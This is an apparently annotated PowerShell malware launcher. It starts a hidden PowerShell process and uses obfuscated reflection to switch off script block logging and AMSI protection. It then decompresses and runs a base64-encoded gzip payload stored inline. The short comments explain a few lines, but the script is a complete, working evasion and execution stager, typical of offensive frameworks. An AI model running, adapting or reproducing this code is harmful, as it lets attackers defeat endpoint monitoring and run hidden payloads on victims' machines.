if([IntPtr]::Size -eq 4) #checks if its a 32 bit
{
    $b='powershell.exe'
}else
{
    $b=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe'
};
$s=New-Object System.Diagnostics.ProcessStartInfo; #specifies a set of values used when you start a process
$s.FileName=$b; #powershell application
$s.Arguments='-noni -nop -w hidden -c If($PSVersionTable.PSVersion.Major -ge 3){ $lANI=((''''+''En''+''{1}{2}''+''l''+''e{3}criptBloc{0}Loggin''+''g'')-f''k'',''a'',''b'',''S''); $cYaa=[Collections.Generic.Dictionary[string,System.Object]]::new(); $je2=((''{1}na{3}le{2}criptBl''+''ock{4}n{0}oca''+''ti''+''on{5}''+''og''+''gi''+''n''+''g'')-f''v'',''E'',''S'',''b'',''I'',''L''); $qreNd=[Ref].Assembly.GetType(((''{3}''+''yste''+''m''+''.{''+''2}ana{0''+''}ement.{5}ut''+''omation.{4}ti''+''{1}s'')-f''g'',''l'',''M'',''S'',''U'',''A'')); $r3mEC=((''Scri{2}''+''t{1}''+''lo''+''ckLogg''+''i{0}g'')-f''n'',''B'',''p''); $ix4zx=[Ref].Assembly.GetType(((''{''+''5''+''}{1}''+''st''+''e''+''m{9}{2}ana''+''{0}emen''+''t{9}{''+''8}{''+''4}t''+''{7}''+''ma''+''t''+''i{7}n{9}''+''{8}ms''+''i''+''{6}t''+''i''+''{''+''3''+''}s'')-f''g'',''y'',''M'',''l'',''u'',''S'',''U'',''o'',''A'',''.'')); $qstof=$qreNd.GetField(''cachedGroupPolicySettings'',''NonPublic,Static''); if ($ix4zx) { $ix4zx.GetField(((''''+''a{0}''+''{1''+''}iIn''+''i{2''+''}{''+''4''+''}ail{3}d''+'''')-f''m'',''s'',''t'',''e'',''F''),''NonPublic,Static'').SetValue($null,$true); }; If ($qstof) { $nW=$qstof.GetValue($null); $cYaa.Add($je2,0); $cYaa.Add($lANI,0); $nW[''HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\''+$r3mEC]=$cYaa; If($nW[$r3mEC]){ $nW[$r3mEC][$je2]=0; $nW[$r3mEC][$lANI]=0; } } Else { [Ref].Assembly.GetType(((''S{1}stem''+''.{4}a''+''n''+''a''+''geme''+''n''+''t.{0}{3}tomatio''+''n.Sc{2}iptB''+''{5}ock'')-f''A'',''y'',''r'',''u'',''M'',''l'')).GetField(''signatures'',''NonPublic,Static'').SetValue($null,(New-Object Collections.Generic.HashSet[string])); }};&amp;([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String(((''H4sIANGX/2ICA7VW+2/aSB''+''D+vVL/B6tCslEJNo82D6nSrW1eTSAGBwhQdNrYi71h7SX2AqG9/{0}83C7h''+''QldzlTqolkn3MzM5+883MzpaxJyiPFX+kfHv7Rtl/Dk5wpGi5r1H3saDk6GrzmD/s5{0}IxrSifFG2CFg{0}bR5j''+''G06sra5kkJBa7ebFBBEpTEj0wSlItr/ylDEOSkLPbh0fiCeWbkv{0}z2GD8AbO92MbCXkiUMxT7c{0}+Ge1g6VnQXjApN/fJFzU/OStNi7WmJWaqp7iYVJCr6jKl55XteHni3WRBNbVMv4SmfieKQxpVy''+''sR+neEY6YG1F2kSE3E9V{0}MzhOgkRyyTe3Uqa2QlpKgydhHvI9xOSpmpBmcgDJtPpH9pkf3pvGQsakWIrFiThC5ckK+qRtNjEsc9Ij8ymoOWKhMbBNJ8HsRWfEy0XLxkrKP/FjNYh6wy71yppx0og5YgkX4Cgnrhnm/tLRnaa6g''+''lHt0TIw5eRAQD8LjGcZfwhzdoJAh0Wsm+y3SHgs{0}bwlG51PylGQWnD4VjwZAPT3F2yJPnpD8CV3DwtvNZWKVMEtfDCg5XJgFN/etD/Kfq59YUUeZnJNpnRmNibGEfUy8iqnQoImTGyRaOYiXXAPU3dbxDfJowEWEiIJS9+UatFVPzQNZeU+SRBHgQ1Ba8''+''g3vmfndlFTVNbcZtEgNx{0}DkTNzSBFSCa9T4tNdrqcg5BqMZymBcVZQo56BcUlmBG/oKA4pfsttBR''+''8O1QP7raXTFAPpyIzN83/BOb+UIvHqUiWHkQUALhzF8SjmEk8CkqT+sTc{0}DTIDldPomFhxiBxwNIKogErEgVXSJ4k4CdwIl90iWhFC0YikNjWizrDA''+''VSHfXJsaYUD4qsnncwyYEd3iUkGxpGLEGiXcVFQBjQRUHskvsCr/+HAryUHPLESso+JliXVxNwISftcfC3Kkpx7bLZIJAJQqCc8MnFKP''+''lZ3xUV7p99SB8E3spv{0}{0}C''+''XcNvxs+NVbMaOVFrfP/evPj0297Vmp06hfILoO1t5FB3n+Z59c{0}oOqcGstYTmo2a''+''WGWQ0907jbjoNRvyVGLdS8Cz1mOLX5s15NDbp{0}DqWtnQ2vWm3eG6hSqd5WjDlAN6KlYI78TkTXzzcwhip6e2O2UtNosdpnq/cwLNfHQ9bUq''+''/VwN{0}Sp+3Fk67p+6WO7vUHI5H6lvbkv9fhd04vMasz1S6s6RzWErLg2qJv8emQmyNEHOFjwRbnT6keBhVDjnJJxt183{0}926ifqNxyf7Ug/0y+E9Ds3hoEzHi/teCPP6{0}tm91o1qyydf+XgNwDU4wkEPZAKr7IUzkLHfI''+''/N9h6''+''dl''+''PDc5MkGmPn5CjXC0qDsM9{0}/6ZY4GrHOP0c14U9f10sipoqbBh40AdUEcB2YXo3Rlf7X10sDn/vBDZzTTB/fsXLetrhPeyzvri0j+XTfta29cWn{0}351XTeLIiGrGHsq9f9i/MeH0dOKvA7w7Pe8+dzQOc29f1wTsgzKRPY1EpA1dWH2QhffsmR3pHnHmpS7RxkoaYAZeg/GepXOdJfV/QHU6lhqbBw2BOkpgwaKXQbLMsQIxxT7YTWfihk+36i2x3/dbWoVOjvPJDMH/oMtnS1dUYXIS8krQv3pA4EGHBeK4YBrQH49moblPo9Rez+GKjbY0VZIMBXDLbbGsbzNGZomm/Gyp4RAgoaS+C9RJ{0}cPAcihBUxF''+''11kOiZnLNj7LaXOnDgCDhArAS3nsjXgyQHqJ+RJyUnZGs9btU5f1D6nYTZF7gQ/vn/QpjD''+''2j/sv''+''opERkEi88vizwtHPeG33X6IqQA5F4o0I7v3wkkQ9glyFFkIC7B/tv/kC/''+''p2Kc468CLbtom/AR0NqZa6CwAA'')-f''u'')))),[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';


$s.UseShellExecute=$false; #don't start the process using OS shell
$s.RedirectStandardOutput=$true;
$s.WindowStyle='Hidden';
$s.CreateNoWindow=$true;
$p=[System.Diagnostics.Process]::Start($s);